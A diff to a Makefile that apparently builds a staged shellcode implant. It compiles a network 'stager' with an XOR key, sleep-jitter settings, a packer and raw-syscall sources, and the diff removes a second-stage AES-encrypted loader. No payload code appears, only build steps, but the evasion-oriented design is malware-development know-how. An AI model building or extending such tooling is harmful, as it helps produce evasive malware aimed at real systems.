@@ -51,49 +51,14 @@ COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 COMMON_CFLAGS += -DSLEEP_MIN=$(SLEEP_MIN)
 COMMON_CFLAGS += -DSLEEP_MAX=$(SLEEP_MAX)
 
-STAGE0_SRCS = downloader.c net_utils.c utils_min.c debug.c
-STAGE1_SRCS = stub.c aes.c tinflate.c utils.c debug.c
+STAGE0_SRCS = downloader.c net_utils.c utils_min.c packer.c debug.c syscalls.c
 
 STAGE0_TARGET = stager
-STAGE1_TARGET = loader
-STAGE1_PRE_TARGET = loader.pre
-STAGE1_PRE_BIN = loader.pre.bin
-STAGE1_BIN = loader.bin
-STAGE1_SIZE_H = stage1_size.h
-
 SHELLCODE = stager.bin
 
 .PHONY: all clean
 
-all: $(SHELLCODE) $(STAGE1_BIN) verify_loader_pic
-
-$(STAGE1_PRE_TARGET): $(STAGE1_SRCS)
-	$(CC) $(COMMON_CFLAGS) -DSTAGE1_SIZE=0 $(STAGE1_LDFLAGS) -o $@ $(STAGE1_SRCS)
-
-$(STAGE1_PRE_BIN): $(STAGE1_PRE_TARGET)
-	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $<
-	objcopy -O binary -j .init -j .text -j .rodata -j .data $< $@
-
-$(STAGE1_SIZE_H): $(STAGE1_PRE_BIN)
-	@echo "#ifndef STAGE1_SIZE_H" > $@
-	@echo "#define STAGE1_SIZE_H" >> $@
-	@echo "#define STAGE1_SIZE $$(wc -c < $(STAGE1_PRE_BIN))" >> $@
-	@echo "#endif" >> $@
-
-$(STAGE1_TARGET): $(STAGE1_SRCS) $(STAGE1_SIZE_H)
-	$(CC) $(COMMON_CFLAGS) -include $(STAGE1_SIZE_H) $(STAGE1_LDFLAGS) -o $@ $(STAGE1_SRCS)
-
-$(STAGE1_BIN): $(STAGE1_TARGET)
-	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE1_TARGET)
-	objcopy -O binary -j .init -j .text -j .rodata -j .data $(STAGE1_TARGET) $@
-	@echo "Stage1 loader generated at $(PWD)/$@"
-
-verify_loader_pic: $(STAGE1_TARGET)
-	@if readelf -r $(STAGE1_TARGET) | grep -Eq 'R_X86_64_(64|32|32S)'; then \
-		echo "Error: absolute relocations detected in $(STAGE1_TARGET)"; \
-		readelf -r $(STAGE1_TARGET); \
-		exit 1; \
-		fi
+all: $(SHELLCODE)
 
 $(STAGE0_TARGET): $(STAGE0_SRCS)
 	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
@@ -105,6 +70,5 @@ $(SHELLCODE): $(STAGE0_TARGET)
 	@wc -c $@
 
 clean:
-	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(STAGE1_TARGET) $(STAGE1_PRE_TARGET) \
-		$(STAGE1_BIN) $(STAGE1_PRE_BIN) $(STAGE1_SIZE_H) \
+	rm -f $(STAGE0_TARGET) $(SHELLCODE) \
 		downloader downloader.bin downloader_blob.h *.o
